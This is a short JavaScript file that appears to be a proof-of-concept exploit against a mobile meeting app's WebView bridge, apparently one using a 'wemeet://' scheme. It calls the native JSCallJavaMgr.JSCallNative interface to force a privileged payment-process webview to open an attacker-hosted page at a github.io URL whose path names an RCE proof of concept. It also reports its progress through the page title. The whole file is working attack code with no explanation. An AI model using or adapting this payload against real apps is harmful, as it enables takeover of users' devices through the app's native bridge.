(function(){
  document.title='P83TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P83CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code);
  };
  function c(id,mod,m,p){
    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
      callback:'window.__p',module:mod,method:m,param:p,callId:id
    }));
  }
  var attacker='https://gitwhs.github.io/wm-poc-rce/p83atk.html';
  var payMain='wemeet://page/pay/main_process_webview';
  setTimeout(function(){
    c('O6','CommonPlugin','OpenNewPage',{scheme:payMain,router_params:{url:attacker,from_webView:true}});
    document.title='P83TB-DONE:'+location.host;
  }, 1500);
})();
